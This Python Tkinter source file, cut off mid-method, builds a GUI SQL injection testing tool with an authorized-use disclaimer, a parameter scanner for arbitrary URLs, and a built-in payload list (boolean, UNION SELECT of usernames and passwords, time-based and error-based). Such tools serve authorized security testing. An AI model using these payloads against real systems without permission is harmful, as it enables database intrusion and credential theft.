import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import requests
from bs4 import BeautifulSoup
import re
import subprocess
import json
import csv
import pandas as pd
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
import pickle
import os
from datetime import datetime
import threading
import time
import sqlite3
from urllib.parse import urljoin, urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EnhancedSQLInjectionTool:
    def __init__(self, master):
        self.master = master
        master.title("Enhanced SQL Injection Security Testing Tool")
        master.geometry("1400x900")
        master.state('zoomed')  # Maximize window on Windows
        
        # Add disclaimer
        self.show_disclaimer()
        
        # Initialize variables
        self.init_variables()
        
        # Create main notebook for tabs
        self.notebook = ttk.Notebook(master)
        self.notebook.pack(expand=True, fill="both", padx=10, pady=10)
        
        # Create tabs
        self.create_query_builder_tab()
        self.create_vulnerability_scanner_tab()
        self.create_payload_manager_tab()
        self.create_session_manager_tab()
        self.create_report_generator_tab()
        self.create_settings_tab()
        
        # Status bar
        self.create_status_bar()
        
        # Initialize database
        self.init_database()

    def show_disclaimer(self):
        disclaimer = """
SECURITY TESTING TOOL DISCLAIMER

This tool is designed for legitimate security testing and educational purposes only.

AUTHORIZED USE ONLY:
• Only use on systems you own or have explicit written permission to test
• Ensure you have proper authorization before testing any web application
• Follow responsible disclosure practices for any vulnerabilities found

PROHIBITED USES:
• Testing systems without explicit permission
• Malicious attacks on third-party systems
• Any illegal activities

By continuing, you acknowledge that you will use this tool responsibly and legally.
        """
        
        result = messagebox.askyesno("Security Testing Tool Disclaimer", disclaimer)
        if not result:
            self.master.quit()

    def init_variables(self):
        # Database schema (enhanced)
        self.schema = {
            "users": ["id", "username", "email", "password", "created_at", "status"],
            "orders": ["id", "user_id", "product", "quantity", "price", "order_date"],
            "products": ["id", "name", "price", "category", "description", "stock"],
            "categories": ["id", "name", "description"],
            "payments": ["id", "order_id", "amount", "payment_method", "transaction_id"]
        }
        
        # Payloads database
        self.sql_payloads = {
            "Basic": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 'a'='a",
                "admin'--",
                "' OR '1'='1' /*"
            ],
            "Union-based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION SELECT username,password FROM users--"
            ],
            "Time-based": [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(MID((SELECT version()),1,50),FLOOR(RAND(0)*2))) = 1--"
            ],
            "Error-based": [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1234)--"
            ]
        }
        
        # Custom payloads and tamper scripts
        self.custom_payloads = []
        self.tamper_scripts = []
        
        # Session management
        self.current_session = {}
        self.session_history = []
        
        # Scan results
        self.scan_results = []
        
        # Settings
        self.settings = {
            "timeout": 30,
            "threads": 5,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "delay": 0,
            "proxy": ""
        }

    def create_query_builder_tab(self):
        self.query_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.query_tab, text="Query Builder")
        
        # Create paned window
        paned = ttk.PanedWindow(self.query_tab, orient=tk.HORIZONTAL)
        paned.pack(expand=True, fill="both", padx=5, pady=5)
        
        # Left panel - Schema browser
        schema_frame = ttk.LabelFrame(paned, text="Database Schema", padding=10)
        paned.add(schema_frame, weight=1)
        
        self.schema_tree = ttk.Treeview(schema_frame, height=15)
        schema_scroll = ttk.Scrollbar(schema_frame, orient="vertical", command=self.schema_tree.yview)
        self.schema_tree.configure(yscrollcommand=schema_scroll.set)
        
        self.schema_tree.pack(side="left", expand=True, fill="both")
        schema_scroll.pack(side="right", fill="y")
        
        self.populate_schema_tree()
        
        # Middle panel - Query builder
        query_frame = ttk.LabelFrame(paned, text="Query Builder", padding=10)
        paned.add(query_frame, weight=2)
        
        # Table selection
        ttk.Label(query_frame, text="Select Table:").pack(anchor="w")
        self.table_var = tk.StringVar()
        self.table_combo = ttk.Combobox(query_frame, textvariable=self.table_var, 
                                       values=list(self.schema.keys()), state="readonly")
        self.table_combo.pack(fill="x", pady=(0, 10))
        self.table_combo.bind("<<ComboboxSelected>>", self.update_columns)
        
        # Column selection
        ttk.Label(query_frame, text="Select Columns:").pack(anchor="w")
        columns_frame = ttk.Frame(query_frame)
        columns_frame.pack(fill="both", expand=True, pady=(0, 10))
        
        self.columns_listbox = tk.Listbox(columns_frame, selectmode=tk.MULTIPLE, height=6)
        columns_scroll = ttk.Scrollbar(columns_frame, orient="vertical", command=self.columns_listbox.yview)
        self.columns_listbox.configure(yscrollcommand=columns_scroll.set)
        
        self.columns_listbox.pack(side="left", expand=True, fill="both")
        columns_scroll.pack(side="right", fill="y")
        
        # Condition builder
        ttk.Label(query_frame, text="Add Conditions:").pack(anchor="w")
        condition_frame = ttk.Frame(query_frame)
        condition_frame.pack(fill="x", pady=(0, 10))
        
        self.condition_column = ttk.Combobox(condition_frame, width=15)
        self.condition_column.pack(side="left", padx=(0, 5))
        
        self.condition_operator = ttk.Combobox(condition_frame, values=["=", ">", "<", ">=", "<=", "LIKE", "IN"], 
                                              width=10, state="readonly")
        self.condition_operator.pack(side="left", padx=(0, 5))
        
        self.condition_value = ttk.Entry(condition_frame, width=20)
        self.condition_value.pack(side="left", padx=(0, 5))
        
        ttk.Button(condition_frame, text="Add", command=self.add_condition).pack(side="left")
        
        # Conditions list
        conditions_frame = ttk.Frame(query_frame)
        conditions_frame.pack(fill="both", expand=True, pady=(0, 10))
        
        self.conditions_listbox = tk.Listbox(conditions_frame, height=4)
        conditions_listbox_scroll = ttk.Scrollbar(conditions_frame, orient="vertical", 
                                                 command=self.conditions_listbox.yview)
        self.conditions_listbox.configure(yscrollcommand=conditions_listbox_scroll.set)
        
        self.conditions_listbox.pack(side="left", expand=True, fill="both")
        conditions_listbox_scroll.pack(side="right", fill="y")
        
        # Buttons
        button_frame = ttk.Frame(query_frame)
        button_frame.pack(fill="x", pady=(0, 10))
        
        ttk.Button(button_frame, text="Build Query", command=self.build_query).pack(side="left", padx=(0, 5))
        ttk.Button(button_frame, text="Clear", command=self.clear_query).pack(side="left", padx=(0, 5))
        ttk.Button(button_frame, text="Test Query", command=self.test_query).pack(side="left")
        
        # Query display
        ttk.Label(query_frame, text="Generated Query:").pack(anchor="w")
        self.query_text = scrolledtext.ScrolledText(query_frame, height=8, wrap=tk.WORD)
        self.query_text.pack(fill="both", expand=True)
        
        # Right panel - Results
        results_frame = ttk.LabelFrame(paned, text="Query Results", padding=10)
        paned.add(results_frame, weight=2)
        
        self.query_results = scrolledtext.ScrolledText(results_frame, wrap=tk.WORD)
        self.query_results.pack(expand=True, fill="both")

    def create_vulnerability_scanner_tab(self):
        self.vuln_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.vuln_tab, text="Vulnerability Scanner")
        
        # Create paned window
        paned = ttk.PanedWindow(self.vuln_tab, orient=tk.HORIZONTAL)
        paned.pack(expand=True, fill="both", padx=5, pady=5)
        
        # Left panel - Configuration
        config_frame = ttk.LabelFrame(paned, text="Scan Configuration", padding=10)
        paned.add(config_frame, weight=1)
        
        # Target URL
        ttk.Label(config_frame, text="Target URL:").pack(anchor="w")
        self.url_entry = ttk.Entry(config_frame, width=50)
        self.url_entry.pack(fill="x", pady=(0, 10))
        
        # HTTP Method
        ttk.Label(config_frame, text="HTTP Method:").pack(anchor="w")
        self.http_method_var = tk.StringVar(value="GET")
        method_frame = ttk.Frame(config_frame)
        method_frame.pack(fill="x", pady=(0, 10))
        
        ttk.Radiobutton(method_frame, text="GET", variable=self.http_method_var, value="GET").pack(side="left")
        ttk.Radiobutton(method_frame, text="POST", variable=self.http_method_var, value="POST").pack(side="left")
        ttk.Radiobutton(method_frame, text="PUT", variable=self.http_method_var, value="PUT").pack(side="left")
        
        # Parameters
        ttk.Label(config_frame, text="Parameters (key=value format):").pack(anchor="w")
        self.params_text = scrolledtext.ScrolledText(config_frame, height=6, wrap=tk.WORD)
        self.params_text.pack(fill="both", expand=True, pady=(0, 10))
        
        # Headers
        ttk.Label(config_frame, text="Custom Headers:").pack(anchor="w")
        self.headers_text = scrolledtext.ScrolledText(config_frame, height=4, wrap=tk.WORD)
        self.headers_text.pack(fill="both", expand=True, pady=(0, 10))
        
        # Cookies
        ttk.Label(config_frame, text="Cookies:").pack(anchor="w")
        self.cookies_entry = ttk.Entry(config_frame)
        self.cookies_entry.pack(fill="x", pady=(0, 10))
        
        # Scan options
        ttk.Label(config_frame, text="Scan Options:").pack(anchor="w")
        options_frame = ttk.Frame(config_frame)
        options_frame.pack(fill="x", pady=(0, 10))
        
        self.scan_get_var = tk.BooleanVar(value=True)
        self.scan_post_var = tk.BooleanVar(value=True)
        self.scan_cookies_var = tk.BooleanVar(value=False)
        self.scan_headers_var = tk.BooleanVar(value=False)
        
        ttk.Checkbutton(options_frame, text="GET Parameters", variable=self.scan_get_var).pack(anchor="w")
        ttk.Checkbutton(options_frame, text="POST Parameters", variable=self.scan_post_var).pack(anchor="w")
        ttk.Checkbutton(options_frame, text="Cookies", variable=self.scan_cookies_var).pack(anchor="w")
        ttk.Checkbutton(options_frame, text="Headers", variable=self.scan_headers_var).pack(anchor="w")
        
        # Scan profile
        ttk.Label(config_frame, text="Scan Profile:").pack(anchor="w")
        self.scan_profile_var = tk.StringVar(value="Comprehensive")
        self.scan_profile_combo = ttk.Combobox(config_frame, textvariable=self.scan_profile_var,
                                              values=["Basic", "Comprehensive", "Time-based", "Error-based", "Union-based"],
                                              state="readonly")
        self.scan_profile_combo.pack(fill="x", pady=(0, 10))
        
        # Risk level
        ttk.Label(config_frame, text="Risk Level:").pack(anchor="w")
        self.risk_var = tk.StringVar(value="2")
        risk_frame = ttk.Frame(config_frame)
        risk_frame.pack(fill="x", pady=(0, 10))
        
        ttk.Scale(risk_frame, from_=1, to=3, variable=self.risk_var, orient="horizontal").pack(fill="x")
        ttk.Label(risk_frame, text="1=Low, 2=Medium, 3=High").pack()
        
        # Buttons
        button_frame = ttk.Frame(config_frame)
        button_frame.pack(fill="x", pady=10)
        
        ttk.Button(button_frame, text="Start Scan", command=self.start_vulnerability_scan).pack(fill="x", pady=(0, 5))
        ttk.Button(button_frame, text="Stop Scan", command=self.stop_scan).pack(fill="x", pady=(0, 5))
        ttk.Button(button_frame, text="Clear Results", command=self.clear_scan_results).pack(fill="x")
        
        # Progress
        ttk.Label(config_frame, text="Progress:").pack(anchor="w", pady=(10, 0))
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(config_frame, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill="x", pady=(0, 5))
        
        self.status_var = tk.StringVar(value="Ready")
        ttk.Label(config_frame, textvariable=self.status_var).pack(anchor="w")
        
        # Right panel - Results
        results_frame = ttk.LabelFrame(paned, text="Scan Results", padding=10)
        paned.add(results_frame, weight=2)
        
        # Results tree
        self.results_tree = ttk.Treeview(results_frame, columns=("Severity", "Type", "Parameter"), show="tree headings")
        self.results_tree.heading("#0", text="URL")
        self.results_tree.heading("Severity", text="Severity")
        self.results_tree.heading("Type", text="Type")
        self.results_tree.heading("Parameter", text="Parameter")
        
        results_scroll = ttk.Scrollbar(results_frame, orient="vertical", command=self.results_tree.yview)
        self.results_tree.configure(yscrollcommand=results_scroll.set)
        
        self.results_tree.pack(side="left", expand=True, fill="both")
        results_scroll.pack(side="right", fill="y")
        
        # Bind double-click for details
        self.results_tree.bind("<Double-1>", self.show_vulnerability_details)

    def create_payload_manager_tab(self):
        self.payload_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.payload_tab, text="Payload Manager")
        
        # Create paned window
        paned = ttk.PanedWindow(self.payload_tab, orient=tk.HORIZONTAL)
        paned.pack(expand=True, fill="both", padx=5, pady=5)
        
        # Left panel - Payload categories
        categories_frame = ttk.LabelFrame(paned, text="Payload Categories", padding=10)
        paned.add(categories_frame, weight=1)
        
        self.payload_categories = ttk.Treeview(categories_frame)
        self.payload_categories.pack(expand=True, fill="both")
        
        self.populate_payload_categories()
        self.payload_categories.bind("<<TreeviewSelect>>", self.on_category_select)
        
        # Middle panel - Payload list
        payloads_frame = ttk.LabelFrame(paned, text="Payloads", padding=10)
        paned.add(payloads_frame, weight=2)
        
        self.payloads_listbox = tk.Listbox(payloads_frame)
        payloads_scroll = ttk.Scrollbar(payloads_frame, orient="vertical", command=self.payloads_listbox.yview)
        self.payloads_listbox.configure(yscrollcommand=payloads_scroll.set)
        
        self.payloads_listbox.pack(side="left", expand=True, fill="both")
        payloads_scroll.pack(side="right", fill="y")
        
        # Right panel - Payload editor
        editor_frame = ttk.LabelFrame(paned, text="Payload Editor", padding=10)
        paned.add(editor_frame, weight=2)
        
        # Payload text editor
        self.payload_editor = scrolledtext.ScrolledText(editor_frame, height=15, wrap=tk.WORD)
        self.payload_editor.pack(expand=True, fill="both", pady=(0, 10))
        
        # Editor buttons
        editor_buttons = ttk.Frame(editor_frame)
        editor_buttons.pack(fill="x")
        
        ttk.Button(editor_buttons, text="Add Payload", command=self.add_custom_payload_dialog).pack(side="left", padx=(0, 5))
        ttk.Button(editor_buttons, text="Save Changes", command=self.save_payload_changes).pack(side="left", padx=(0, 5))
        ttk.Button(editor_buttons, text="Delete Payload", command=self.delete_payload).pack(side="left", padx=(0, 5))
        ttk.Button(editor_buttons, text="Test Payload", command=self.test_payload).pack(side="left")

    def create_session_manager_tab(self):
        self.session_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.session_tab, text="Session Manager")
        
        # Create paned window
        paned = ttk.PanedWindow(self.session_tab, orient=tk.VERTICAL)
        paned.pack(expand=True, fill="both", padx=5, pady=5)
        
        # Top panel - Current session
        current_frame = ttk.LabelFrame(paned, text="Current Session", padding=10)
        paned.add(current_frame, weight=1)
        
        # Session info
        session_info_frame = ttk.Frame(current_frame)
        session_info_frame.pack(fill="x", pady=(0, 10))
        
        ttk.Label(session_info_frame, text="Session Name:").pack(side="left")
        self.session_name_var = tk.StringVar()
        self.session_name_entry = ttk.Entry(session_info_frame, textvariable=self.session_name_var)
        self.session_name_entry.pack(side="left", expand=True, fill="x", padx=(5, 10))
        
        ttk.Button(session_info_frame, text="Save Session", command=self.save_session_dialog).pack(side="left", padx=(0, 5))
        ttk.Button(session_info_frame, text="Load Session", command=self.load_session_dialog).pack(side="left")
        
        # Session details
        self.session_details = scrolledtext.ScrolledText(current_frame, height=10, wrap=tk.WORD)
        self.session_details.pack(expand=True, fill="both")
        
        # Bottom panel - Session history
        history_frame = ttk.LabelFrame(paned, text="Session History", padding=10)
        paned.add(history_frame, weight=1)
        
        # History tree
        self.history_tree = ttk.Treeview(history_frame, columns=("Date", "Target", "Vulnerabilities"), show="tree headings")
        self.history_tree.heading("#0", text="Session")
        self.history_tree.heading("Date", text="Date")
        self.history_tree.heading("Target", text="Target")
        self.history_tree.heading("Vulnerabilities", text="Vulnerabilities Found")
        
        history_scroll = ttk.Scrollbar(history_frame, orient="vertical", command=self.history_tree.yview)
        self.history_tree.configure(yscrollcommand=history_scroll.set)
        
        self.history_tree.pack(side="left", expand=True, fill="both")
        history_scroll.pack(side="right", fill="y")
        
        # History buttons
        history_buttons = ttk.Frame(history_frame)
        history_buttons.pack(fill="x", pady=(10, 0))
        
        ttk.Button(history_buttons, text="Load Selected", command=self.load_selected_session).pack(side="left", padx=(0, 5))
        ttk.Button(history_buttons, text="Delete Selected", command=self.delete_selected_session).pack(side="left", padx=(0, 5))
        ttk.Button(history_buttons, text="Export Selected", command=self.export_selected_session).pack(side="left")
        
        self.load_session_history()

    def create_report_generator_tab(self):
        self.report_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.report_tab, text="Report Generator")
        
        # Create paned window
        paned = ttk.PanedWindow(self.report_tab, orient=tk.HORIZONTAL)
        paned.pack(expand=True, fill="both", padx=5, pady=5)
        
        # Left panel - Report configuration
        config_frame = ttk.LabelFrame(paned, text="Report Configuration", padding=10)
        paned.add(config_frame, weight=1)
        
        # Report title
        ttk.Label(config_frame, text="Report Title:").pack(anchor="w")
        self.report_title_var = tk.StringVar(value="SQL Injection Security Assessment Report")
        ttk.Entry(config_frame, textvariable=self.report_title_var).pack(fill="x", pady=(0, 10))
        
        # Client information
        ttk.Label(config_frame, text="Client/Organization:").pack(anchor="w")
        self.client_var = tk.StringVar()
        ttk.Entry(config_frame, textvariable=self.client_var).pack(fill="x", pady=(0, 10))
        
        # Tester information
        ttk.Label(config_frame, text="Tester Name:").pack(anchor="w")
        self.tester_var = tk.StringVar()
        ttk.Entry(config_frame, textvariable=self.tester_var).pack(fill="x", pady=(0, 10))
        
        # Report format
        ttk.Label(config_frame, text="Report Format:").pack(anchor="w")
        self.report_format_var = tk.StringVar(value="PDF")
        format_frame = ttk.Frame(config_frame)
        format_frame.pack(fill="x", pady=(0, 10))
        
        ttk.Radiobutton(format_frame, text="PDF", variable=self.report_format_var, value="PDF").pack(anchor="w")
        ttk.Radiobutton(format_frame, text="HTML", variable=self.report_format_var, value="HTML").pack(anchor="w")
        ttk.Radiobutton(format_frame, text="CSV", variable=self.report_format_var, value="CSV").pack(anchor="w")
        ttk.Radiobutton(format_frame, text="JSON", variable=self.report_format_var, value="JSON").pack(anchor="w")
        
        # Include sections
        ttk.Label(config_frame, text="Include Sections:").pack(anchor="w", pady=(10, 0))
        
        self.include_executive_var = tk.BooleanVar(value=True)
        self.include_technical_var = tk.BooleanVar(value=True)
        self.include_recommendations_var = tk.BooleanVar(value=True)
        self.include_appendix_var = tk.BooleanVar(value=True)
        
        ttk.Checkbutton(config_frame, text="Executive Summary", variable=self.include_executive_var).pack(anchor="w")
        ttk.Checkbutton(config_frame, text="Technical Details", variable=self.include_technical_var).pack(anchor="w")
        ttk.Checkbutton(config_frame, text="Recommendations", variable=self.include_recommendations_var).pack(anchor="w")
        ttk.Checkbutton(config_frame, text="Appendix", variable=self.include_appendix_var).pack(anchor="w")
        
        # Generate button
        ttk.Button(config_frame, text="Generate Report", command=self.generate_report).pack(fill="x", pady=(20, 0))
        
        # Right panel - Report preview
        preview_frame = ttk.LabelFrame(paned, text="Report Preview", padding=10)
        paned.add(preview_frame, weight=2)
        
        self.report_preview = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD)
        self.report_preview.pack(expand=True, fill="both")

    def create_settings_tab(self):
        self.settings_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_tab, text="Settings")
        
        # Create notebook for settings categories
        settings_notebook = ttk.Notebook(self.settings_tab)
        settings_notebook.pack(expand=True, fill="both", padx=10, pady=10)
        
        # General settings
        general_frame = ttk.Frame(settings_notebook)
        settings_notebook.add(general_frame, text="General")
        
        # Timeout setting
        ttk.Label(general_frame, text="Request Timeout (seconds):").pack(anchor="w", pady=(10, 0))
        self.timeout_var = tk.StringVar(value=str(self.settings["timeout"]))
        ttk.Entry(general_frame, textvariable=self.timeout_var, width=10).pack(anchor="w")
        
        # Threads setting
        ttk.Label(general_frame, text="Number of Threads:").pack(anchor="w", pady=(10, 0))
        self.threads_var = tk.StringVar(value=str(self.settings["threads"]))
        ttk.Entry(general_frame, textvariable=self.threads_var, width=10).pack(anchor="w")
        
        # User agent setting
        ttk.Label(general_frame, text="User Agent:").pack(anchor="w", pady=(10, 0))
        self.user_agent_var = tk.StringVar(value=self.settings["user_agent"])
        ttk.Entry(general_frame, textvariable=self.user_agent_var, width=50).pack(anchor="w", fill="x")
        
        # Delay setting
        ttk.Label(general_frame, text="Delay Between Requests (seconds):").pack(anchor="w", pady=(10, 0))
        self.delay_var = tk.StringVar(value=str(self.settings["delay"]))
        ttk.Entry(general_frame, textvariable=self.delay_var, width=10).pack(anchor="w")
        
        # Proxy settings
        proxy_frame = ttk.Frame(settings_notebook)
        settings_notebook.add(proxy_frame, text="Proxy")
        
        ttk.Label(proxy_frame, text="Proxy Server (host:port):").pack(anchor="w", pady=(10, 0))
        self.proxy_var = tk.StringVar(value=self.settings["proxy"])
        ttk.Entry(proxy_frame, textvariable=self.proxy_var, width=30).pack(anchor="w")
        
        # SSL settings
        ssl_frame = ttk.Frame(settings_notebook)
        settings_notebook.add(ssl_frame, text="SSL/TLS")
        
        self.verify_ssl_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(ssl_frame, text="Verify SSL Certificates", variable=self.verify_ssl_var).pack(anchor="w", pady=10)
        
        # Settings buttons
        settings_buttons = ttk.Frame(self.settings_tab)
        settings_buttons.pack(fill="x", padx=10, pady=10)
        
        ttk.Button(settings_buttons, text="Save Settings", command=self.save_settings).pack(side="left", padx=(0, 5))
        ttk.Button(settings_buttons, text="Reset to Defaults", command=self.reset_settings).pack(side="left", padx=(0, 5))
        ttk.Button(settings_buttons, text="Export Settings", command=self.export_settings).pack(side="left", padx=(0, 5))
        ttk.Button(settings_buttons, text="Import Settings", command=self.import_settings).pack(side="left")

    def create_status_bar(self):
        self.status_frame = ttk.Frame(self.master)
        self.status_frame.pack(fill="x", side="bottom")
        
        self.status_label = ttk.Label(self.status_frame, text="Ready")
        self.status_label.pack(side="left", padx=5)
        
        # Add scanning indicator
        self.scanning_var = tk.StringVar()
        self.scanning_label = ttk.Label(self.status_frame, textvariable=self.scanning_var)
        self.scanning_label.pack(side="right", padx=5)

    def init_database(self):
        """Initialize SQLite database for storing results and sessions"""
        try:
            self.db_path = "sqli_tool.db"
            self.conn = sqlite3.connect(self.db_path)
            cursor = self.conn.cursor()
            
            # Create tables
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scan_results (
                    id INTEGER PRIMARY KEY,
                    url TEXT,
                    method TEXT,
                    parameter TEXT,
                    payload TEXT,
                    vulnerability_type TEXT,
                    severity TEXT,
                    response_time REAL,
                    response_length INTEGER,
                    timestamp TEXT,
                    session_name TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY,
                    name TEXT UNIQUE,
                    target_url TEXT,
                    scan_date TEXT,
                    vulnerabilities_found INTEGER,
                    session_data TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS custom_payloads (
                    id INTEGER PRIMARY KEY,
                    category TEXT,
                    payload TEXT,
                    description TEXT,
                    created_date TEXT
                )
            ''')
            
            self.conn.commit()
        except Exception as e:
            messagebox.showerror("Database Error", f"Failed to initialize database: {str(e)}")

    # Query Builder Methods
    def populate_schema_tree(self):
        """Populate the schema tree with tables and columns"""
        for table, columns in self.schema.items():
            table_node = self.schema_tree.insert("", "end", text=table, values=("table",))
            for column in columns:
                self.schema_tree.insert(table_node, "end", text=column, values=("column",))

    def update_columns(self, event):
        """Update columns listbox when table is selected"""
        selected_table = self.table_var.get()
        self.columns_listbox.delete(0, tk.END)
        self.condition_column['values'] = []
        
        if selected_table in self.schema:
            columns = self.schema[selected_table]
            for column in columns:
                self.columns_listbox.insert(tk.END, column)
            self.condition_column['values'] = columns

    def add_condition(self):
        """Add a condition to the conditions list"""
        column = self.condition_column.get()
        operator = self.condition_operator.get()
        value = self.condition_value.get()
        
        if not all([column, operator, value]):
            messagebox.showwarning("Warning", "Please fill all condition fields.")
            return
        
        # Format value based on operator
        if operator in ["=", "LIKE"]:
            formatted_value = f"'{value}'"
        elif operator == "IN":
            formatted_value = f"({value})"
        else:
            formatted_value = value
        
        condition = f"{column} {operator} {formatted_value}"
        self.conditions_listbox.insert(tk.END, condition)
        
        # Clear fields
        self.condition_column.set("")
        self.condition_operator.set("")
        self.condition_value.delete(0, tk.END)

    def build_query(self):
        """Build SQL query based on selections"""
        table = self.table_var.get()
        if not table:
            messagebox.showwarning("Warning", "Please select a table.")
            return
        
        # Get selected columns
        selected_indices = self.columns_listbox.curselection()
        if not selected_indices:
            columns = "*"
        else:
            columns = ", ".join([self.columns_listbox.get(idx) for idx in selected_indices])
        
        # Build base query
        query = f"SELECT {columns} FROM {table}"
        
        # Add conditions
        conditions = []
        for i in range(self.conditions_listbox.size()):
            conditions.append(self.conditions_listbox.get(i))
        
        if conditions:
            query += " WHERE " + " AND ".join(conditions)
        
        # Add common SQL injection points as comments
        query += "\n\n-- Common injection points:\n"
        query += "-- 1. WHERE clause parameters\n"
        query += "-- 2. ORDER BY clause\n"
        query += "-- 3. LIMIT clause\n"
        query += "-- 4. INSERT/UPDATE values\n"
        
        self.query_text.delete(1.0, tk.END)
        self.query_text.insert(tk.END, query)

    def clear_query(self):
        """Clear all query builder fields"""
        self.table_var.set("")
        self.columns_listbox.selection_clear(0, tk.END)
        self.conditions_listbox.delete(0, tk.END)
        self.query_text.delete(1.0, tk.END)
        self.query_results.delete(1.0, tk.END)

    def test_query(self):
        """Test the built query for syntax"""
        query = self.query_text.get(1.0, tk.END).strip()
        if not query:
            messagebox.showwarning("Warning", "No query to test.")
            return
        
        # Basic SQL syntax validation
        try:
            # Remove comments for validation
            clean_query = re.sub(r'--.*', '', query)
            
            # Basic validation patterns
            if not re.match(r'^\s*SELECT\s+', clean_query, re.IGNORECASE):
                raise ValueError("Query must start with SELECT")
            
            if not re.search(r'\bFROM\s+\w+', clean_query, re.IGNORECASE):
                raise ValueError("Query must contain FROM clause")
            
            self.query_results.delete(1.0, tk.END)
            self.query_results.insert(tk.END, "✓ Query syntax appears valid\n\n")
            self.query_results.insert(tk.END, "Note: This is a basic syntax check only.\n")
            self.query_results.insert(tk.END, "Always test queries in a safe environment.")
            
        except ValueError as e:
            self.query_results.delete(1.0, tk.END)
            self.query_results.insert(tk.END, f"✗ Query validation failed: {str(e)}")

    # Vulnerability Scanner Methods
    def start_vulnerability_scan(self):
        """Start the vulnerability scanning process"""
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL.")
            return
        
        # Validate URL
        if not self.validate_url(url):
            messagebox.showerror("Error", "Invalid URL format.")
            return
        
        # Reset progress and results
        self.progress_var.set(0)
        self.status_var.set("Starting scan...")
        self.scan_results = []
        
        # Clear previous results
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        
        # Start scanning in separate thread
        self.scan_thread = threading.Thread(target=self.run_vulnerability_scan)
        self.scan_thread.daemon = True
        self.scan_thread.start()

    def validate_url(self, url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def run_vulnerability_scan(self):
        """Run the actual vulnerability scan"""
        try:
            url = self.url_entry.get().strip()
            method = self.http_method_var.get()
            scan_profile = self.scan_profile_var.get()
            
            # Parse parameters
            params = self.parse_parameters()
            headers = self.parse_headers()
            cookies = self.parse_cookies()
            
            total_tests = len(params) * len(self.get_payloads_for_profile(scan_profile))
            current_test = 0
            
            for param_name, param_value in params.items():
                for payload_category, payloads in self.get_payloads_for_profile(scan_profile).items():
                    for payload in payloads:
                        if hasattr(self, 'stop_scan_flag') and self.stop_scan_flag:
                            break
                        
                        current_test += 1
                        progress = (current_test / total_tests) * 100
                        self.progress_var.set(progress)
                        self.status_var.set(f"Testing parameter '{param_name}' with {payload_category} payload...")
                        
                        # Test the payload
                        result = self.test_sql_injection(url, method, param_name, payload, headers, cookies)
                        
                        if result['vulnerable']:
                            # Add to results
                            self.scan_results.append(result)
                            self.add_result_to_tree(result)
                        
                        # Respect delay setting
                        time.sleep(float(self.settings.get('delay', 0)))
            
            self.status_var.set(f"Scan completed. Found {len(self.scan_results)} potential vulnerabilities.")
            self.progress_var.set(100)
            
        except Exception as e:
            self.status_var.set(f"Scan error: {str(e)}")
            messagebox.showerror("Scan Error", f"An error occurred during scanning: {str(e)}")

    def parse_parameters(self):
        """Parse parameters from the text area"""
        params_text = self.params_text.get(1.0, tk.END).strip()
        params = {}
        
        for line in params_text.split('\n'):
            line = line.strip()
            if '=' in line:
                key, value = line.split('=', 1)
                params[key.strip()] = value.strip()
        
        return params

    def parse_headers(self):
        """Parse headers from the text area"""
        headers_text = self.headers_text.get(1.0, tk.END).strip()
        headers = {}
        
        for line in headers_text.split('\n'):
            line = line.strip()
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
        
        return headers

    def parse_cookies(self):
        """Parse cookies from the entry field"""
        cookies_text = self.cookies_entry.get().strip()
        cookies = {}
        
        for cookie in cookies_text.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
        
        return cookies

    def get_payloads_for_profile(self, profile):
        """Get payloads based on the selected scan profile"""
        if profile == "Basic":
            return {"Basic": self.sql_payloads["Basic"]}
        elif profile == "Time-based":
            return {"Time-based": self.sql_payloads["Time-based"]}
        elif profile == "Error-based":
            return {"Error-based": self.sql_payloads["Error-based"]}
        elif profile == "Union-based":
            return {"Union-based": self.sql_payloads["Union-based"]}
        else:  # Comprehensive
            return self.sql_payloads

    def test_sql_injection(self, url, method, param_name, payload, headers=None, cookies=None):
        """Test a specific SQL injection payload"""
        result = {
            'url': url,
            'method': method,
            'parameter': param_name,
            'payload': payload,
            'vulnerable': False,
            'vulnerability_type': 'Unknown',
            'severity': 'Low',
            'response_time': 0,
            'response_length': 0,
            'error_message': '',
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            # Prepare request
            if headers is None:
